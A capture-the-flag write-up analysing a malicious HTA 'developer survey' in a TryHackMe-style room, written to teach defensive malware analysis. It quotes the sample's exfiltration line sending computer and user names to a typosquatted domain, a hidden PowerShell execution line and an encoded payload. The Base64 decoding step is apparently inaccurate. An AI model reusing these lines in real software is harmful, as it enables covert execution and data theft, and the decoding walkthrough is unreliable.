# Advent of Cyber 2025 Day 21 - Malware Analysis: Malhare.exe

Learn to identify and analyze malicious HTA files used by attackers to compromise systems.

## Solution:

- Started by understanding the story: TBFC SOC team needs to investigate a suspicious HTA file that compromised elves' laptops through a fake salary survey
- Need to reverse-engineer the HTA to uncover King Malhare's attack methodology
- Important: HTA files should only be opened in text editors, never executed

### Step 1: Understanding HTA Files

- **HTA (HTML Application)**: Desktop applications built using HTML, CSS, and JavaScript that run directly on Windows through `mshta.exe`
- Legitimate uses include administrative tasks, quick interfaces, prototypes, and IT support utilities
- **Structure consists of three parts**:
  - HTA declaration (defines title, window size, behavior)
  - Interface (HTML and CSS for layout)
  - Script (VBScript or JavaScript for logic)

**Why attackers use HTAs:**
- Initial access via phishing
- Downloaders/droppers for additional payloads
- Obfuscation through Base64 encoding
- Living-off-the-land techniques (using built-in Windows tools)

### Step 2: Opening the Malicious HTA File

- Started AttackBox
- Used `pluma` text editor to safely view the HTA without executing it:

```bash
pluma /root/Rooms/AoC2025/Day21/survey.hta
```

![HTA File in Pluma](https://i.imgur.com/placeholder1.png)

### Step 3: Analyzing HTA Metadata

- Located the `<head>` section containing metadata
- Found the title that disguises the malicious file as legitimate

```
<head>
<title>Best Festival Company Developer Survey</title>
<HTA:APPLICATION 
    ID="SurveyApp"
    APPLICATIONNAME="Developer Survey"
    ...
/>
</head>
```

**Answer 1:** Title is `Best Festival Company Developer Survey`

![HTA Metadata Section](https://i.imgur.com/placeholder2.png)

### Step 4: Identifying VBScript Functions

- Located the VBScript section: `<script type="text/vbscript">`
- Found 5 key functions:

**1. window_onLoad**: Auto-executes when HTA loads
```
Function window_onLoad
    getQuestions()
End Function
```

**2. getQuestions()**: Makes external requests and downloads data
```
Function getQuestions()
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Navigate "https://survey.bestfestiivalcompany.com/questions"
    ' ... downloads and decodes data
    provideFeedback(decodedData)
End Function
```

**Answer 2:** Function downloading survey questions is `getQuestions`

![VBScript Functions](https://i.imgur.com/placeholder3.png)

**3. provideFeedback(feedbackString)**: Gathers computer info and exfiltrates
**4. decodeBase64(base64)**: Converts Base64 to binary
**5. RSBinaryToString(xBinary)**: Converts binary to string

### Step 5: Analyzing External Connections

- Found `CreateObject()` calls indicating malicious activity:
  - `InternetExplorer.Application`: Makes external connections
  - `WScript.Network`: Gathers computer information
  - `WScript.Shell`: Executes commands on the system

- Identified the malicious domain in `getQuestions()` function:

```
ie.Navigate "https://survey.bestfestiivalcompany.com/questions"
```

**Answer 3:** URL domain is `survey.bestfestiivalcompany.com`

![Malicious Domain](https://i.imgur.com/placeholder4.png)

### Step 6: Identifying Typosquatting

- Compared domain to legitimate: `bestfestivalcompany.com`
- Noticed double 'i' in malicious domain: `bestfesti**ii**valcompany.com`

**Answer 4:** Character that gives away typosquatting is `i` (double 'i' instead of single 'i')

![Typosquatting Detection](https://i.imgur.com/placeholder5.png)

### Step 7: Analyzing Survey Questions

- Examined the survey data to count questions
- Found a loop structure with 4 iterations

```
For i = 1 To 4
    ' Display question logic
Next
```

**Answer 5:** Survey has `4` questions

### Step 8: Identifying Social Engineering

- Searched for keyword "trip" in the file using Ctrl+F
- Found incentive text used for social engineering:

```
"Complete this survey for a chance to win a trip to the South Pole!"
```

**Answer 6:** Survey promises trip to `South Pole`

![Social Engineering Tactic](https://i.imgur.com/placeholder6.png)

### Step 9: Analyzing Data Exfiltration

- Located the `provideFeedback(feedbackString)` function
- Found code gathering computer information:

```
Set objNetwork = CreateObject("WScript.Network")
computerName = objNetwork.ComputerName
userName = objNetwork.UserName
```

**Answer 7:** Two pieces of information being exfiltrated: `ComputerName,UserName`

![Data Exfiltration Code](https://i.imgur.com/placeholder7.png)

- Found the exfiltration endpoint:

```
ie.Navigate "https://survey.bestfestiivalcompany.com/details?pc=" & computerName & "&user=" & userName
```

**Answer 8:** Exfiltration endpoint is `/details`

**Answer 9:** HTTP method used is `GET` (visible in the Navigate call with query parameters)

### Step 10: Identifying Code Execution

- Found the critical line that executes downloaded payload:

```
runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
```

**Answer 10:** Execution line is `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False`

![Code Execution](https://i.imgur.com/placeholder8.png)

### Step 11: Analyzing the Downloaded Payload

- Downloaded the captured payload from the provided link
- Opened in text editor and observed Base64-encoded content:

```
SW52b2tlLUV4cHJlc3Npb24gJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uR3ppcFN0cmVhbSAkKE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtICgsW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdINHNJQUFBQUFBQUFBTXNLenhJek1EVXhNalkyTnpFNE5qZHBkVEU0TWxGWklVTkFBQUE9JykpKSwgW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKS5SZWFkVG9FbmQoKSk=
```

**Answer 11:** Encoding scheme used is `Base64`

![Base64 Encoded Payload](https://i.imgur.com/placeholder9.png)

### Step 12: Decoding with CyberChef

- Opened CyberChef (https://gchq.github.io/CyberChef/)
- Used "From Base64" recipe to decode the payload
- Result showed ROT13-encoded content:

```
GUZ{Znyjner.Nanylfq}
```

**Answer 12:** Encryption scheme used is `rot13`

![CyberChef Base64 Decode](https://i.imgur.com/placeholder10.png)

### Step 13: Final Decryption

- Added "ROT13" recipe in CyberChef after Base64 decode
- Applied both transformations to reveal the flag

![CyberChef ROT13 Decode](https://i.imgur.com/placeholder11.png)

**Final decoded output:**
```
THM{Malware.Analysed}
```

## Flag:

```
THM{Malware.Analysed}
```

## Concepts learnt:

- **HTA (HTML Application) Files**: Desktop applications using HTML, CSS, and JavaScript that execute directly via Windows `mshta.exe`, combining web development simplicity with desktop application power

- **Malicious HTA Usage**: Attackers exploit HTAs for initial access (phishing), payload delivery, obfuscation, and living-off-the-land techniques using built-in Windows tools

- **VBScript Analysis**: Understanding script structure, function definitions (`Function`, `Sub`), and dangerous API calls like `CreateObject()` for `WScript.Shell`, `InternetExplorer.Application`, and `WScript.Network`

- **Typosquatting**: Domain name technique where attackers register domains that closely resemble legitimate ones (e.g., `festiivalcompany` vs `festivalcompany`) to deceive users

- **Base64 Encoding**: Common obfuscation technique that converts binary/text data into ASCII string format, frequently used in malware to hide URLs, commands, or payloads

- **ROT13 Cipher**: Simple letter substitution cipher that replaces each letter with the letter 13 positions after it in the alphabet, often used as a second layer of obfuscation

- **Data Exfiltration**: Process of unauthorized data transfer from a compromised system, often using HTTP GET/POST requests with encoded parameters

- **Living-off-the-Land (LOtL)**: Attack technique using legitimate, built-in system tools (PowerShell, mshta.exe, wscript.exe) instead of custom malware to evade detection

- **Multi-Layer Obfuscation**: Attackers stack multiple encoding/encryption techniques (Base64 + ROT13) to complicate analysis and evade security tools

- **Social Engineering in Code**: Even technical exploits rely on human psychology - fake surveys, prize incentives, and legitimate-looking interfaces build false trust

## Notes:

- The HTA must NEVER be executed - always open in text editor to prevent infection
- Key red flags in HTA analysis:
  - Hidden windows (`WINDOWSTATE="minimize"`, `SHOWINTASKBAR="no"`)
  - Encoded strings (Base64, hex, etc.)
  - PowerShell with `-nop -w hidden` flags
  - External network connections on load
  - `CreateObject("WScript.Shell")` combined with `.Run()`

- **Analysis workflow for suspicious HTAs:**
  1. Check metadata (`<head>`, `<HTA:APPLICATION>` tags)
  2. Locate script sections (`<script type="text/vbscript">`)
  3. Identify functions and their purposes
  4. Find `CreateObject()` calls (especially Shell, Network)
  5. Decode any Base64/encoded strings
  6. Trace execution flow to understand payload delivery

- **Alternative analysis tools considered:**
  - Any text editor (Notepad++, VS Code, Sublime)
  - CyberChef for decoding
  - Online JavaScript beautifiers for readability
  - VirusTotal for hash/reputation checking (without uploading actual file)

- **Real-world incident reference:** Summer 2025 - Epsilon Red ransomware campaign used HTA files disguised as verification pages to compromise organizations

- **Why PowerShell flags matter:**
  - `-nop`: No profile (skips loading PowerShell profile scripts)
  - `-w hidden`: Hidden window (runs invisibly)
  - `-c`: Command (executes following string as PowerShell)
  - These flags combined = clear indicator of malicious intent

- The "survey questions" were fake data designed to appear legitimate while the HTA executed malicious PowerShell in the background - classic misdirection

- Typosquatting with double letters (ii, rr, nn) is common because it's harder to spot visually, especially in URLs

